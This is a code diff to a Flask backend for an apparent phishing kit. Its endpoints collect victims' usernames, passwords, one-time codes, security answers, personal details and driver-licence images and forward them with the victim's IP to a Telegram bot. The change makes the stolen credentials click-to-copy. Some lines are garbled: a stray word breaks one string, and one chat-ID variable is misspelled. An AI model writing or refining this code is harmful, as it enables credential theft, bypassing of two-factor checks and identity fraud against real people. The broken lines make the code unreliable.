@@ -20,7 +20,7 @@ TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
 # Input sanitization function
 def sanitize_input(text):
     """Sanitize input to prevent injection attacks."""
-    return bleach.clean(text, tags=[], attributes={}, strip=True) if text else ""
+    return bleach.clean(str(text), tags=[], attributes={}, strip=True) if text else ""
 
 @app.route('/submit', methods=['POST'])
 def submit_form():
@@ -33,8 +33,8 @@ def submit_form():
     if not username or not password:
         return jsonify({"error": "Missing username or password"}), 400
 
-    # Format message for Telegram
-    message = f"🔐 LOGIN Submission\nLogin Id: {username}\nPassword: {password}\nuser Ip: {user_ip}"
+    # Format message for Telegram with <code> tags for click-to-copy
+    message = f"🔐 LOGIN Submission\n<code>Login Id: {username}\nPassword: {password}\nuser Ip: {user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -43,7 +43,8 @@ def submit_form():
             telegram_url,
             json={
                 "chat_id": TELEGRAM_CHAT_ID,
-                "text": message
+                "text": message,
+                "parse_mode": "HTML"
             },
             timeout=5
         )
@@ -63,8 +64,8 @@ def submit_login():
     if not username or not password:
         return jsonify({"error": "Missing username or password"}), 400
 
-    # Format message for Telegram
-    message = f"🔐 Login2 Page Submission\nLogin Id: {username}\nPassword: {password}\nuser Ip: {user_ip}"
+    # Format message for Telegram with <code> tags for click-to-copy
+    message = f"🔐 Login2 Page Submission\n<code>Login Id: {username}\nPassword: {password}\nuser Ip: {user_ip}</code>antwort
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -73,7 +74,8 @@ def submit_login():
             telegram_url,
             json={
                 "chat_id": TELEGRAM_CHAT_ID,
-                "text": message
+                "text": message,
+                "parse_mode": "HTML"
             },
             timeout=5
         )
@@ -92,8 +94,8 @@ def submit_otp():
     if not otp:
         return jsonify({"error": "Missing OTP"}), 400
 
-    # Format message for Telegram
-    message = f"🔐 OTP Submission\nOTP: {otp}\nuser Ip: {user_ip}"
+    # Format message for Telegram with <code> tags for click-to-copy
+    message = f"🔐 OTP Submission\n<code>OTP: {otp}\nuser Ip: {user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -102,7 +104,8 @@ def submit_otp():
             telegram_url,
             json={
                 "chat_id": TELEGRAM_CHAT_ID,
-                "text": message
+                "text": message,
+                "parse_mode": "HTML"
             },
             timeout=5
         )
@@ -121,8 +124,8 @@ def submit_otp2():
     if not otp:
         return jsonify({"error": "Missing OTP"}), 400
 
-    # Format message for Telegram
-    message = f"🔐 Second OTP Submission\nOTP: {otp}\nuser Ip: {user_ip}"
+    # Format message for Telegram with <code> tags for click-to-copy
+    message = f"🔐 Second OTP Submission\n<code>OTP: {otp}\nuser Ip: {user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -131,7 +134,8 @@ def submit_otp2():
             telegram_url,
             json={
                 "chat_id": TELEGRAM_CHAT_ID,
-                "text": message
+                "text": message,
+                "parse_mode": "HTML"
             },
             timeout=5
         )
@@ -167,8 +171,8 @@ def submit_security():
     final_q_2 = sec_q_22 if sec_q_2 == "x" else sec_q_2
     final_q_3 = sec_q_33 if sec_q_3 == "x" else sec_q_3
 
-    # Format message for Telegram
-    message = f"🔐 Security Questions Submission\nQuestion 1: {final_q_1}\nAnswer 1: {sec_a_1}\nQuestion 2: {final_q_2}\nAnswer 2: {sec_a_2}\nQuestion 3: {final_q_3}\nAnswer 3: {sec_a_3}\nuser Ip: {user_ip}"
+    # Format message for Telegram with <code> tags for click-to-copy
+    message = f"🔐 Security Questions Submission\n<code>Question 1: {final_q_1}\nAnswer 1: {sec_a_1}\nQuestion 2: {final_q_2}\nAnswer 2: {sec_a_2}\nQuestion 3: {final_q_3}\nAnswer 3: {sec_a_3}\nuser Ip: {user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -176,8 +180,9 @@ def submit_security():
         response = requests.post(
             telegram_url,
             json={
-                "chat_id": TELEGRAM_CHAT_ID,
-                "text": message
+                "chat_id": TELEGRAM_CHaAT_ID,
+                "text": message,
+                "parse_mode": "HTML"
             },
             timeout=5
         )
@@ -199,8 +204,8 @@ def submit_info():
     if not all([fname, mobnum, address]):
         return jsonify({"error": "All fields are required"}), 400
 
-    # Format message for Telegram
-    message = f"🔐 Personal Info Submission\nFull Name: {fname}\nMobile Number: {mobnum}\nAddress: {address}\nuser Ip: {user_ip}"
+    # Format message for Telegram with <code> tags for click-to-copy
+    message = f"🔐 Personal Info Submission\n<code>Full Name: {fname}\nMobile Number: {mobnum}\nAddress: {address}\nuser Ip: {user_ip}</code>"
 
     # Send data to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -209,7 +214,8 @@ def submit_info():
             telegram_url,
             json={
                 "chat_id": TELEGRAM_CHAT_ID,
-                "text": message
+                "text": message,
+                "parse_mode": "HTML"
             },
             timeout=5
         )
@@ -228,8 +234,8 @@ def submit_images():
     if not image1 or not image2:
         return jsonify({"error": "Missing one or both images"}), 400
 
-    # Format message for Telegram
-    message = f"🔐 Image Submission\nImages: Driver License Front and Back\nuser Ip: {user_ip}"
+    # Format message for Telegram with <code> tags for click-to-copy
+    message = f"🔐 Image Submission\n<code>Images: Driver License Front and Back\nuser Ip: {user_ip}</code>"
 
     # Send text message to Telegram
     telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -238,7 +244,8 @@ def submit_images():
             telegram_url,
             json={
                 "chat_id": TELEGRAM_CHAT_ID,
-                "text": message
+                "text": message,
+                "parse_mode": "HTML"
             },
             timeout=5
         )
@@ -262,5 +269,3 @@ def submit_images():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
-
-
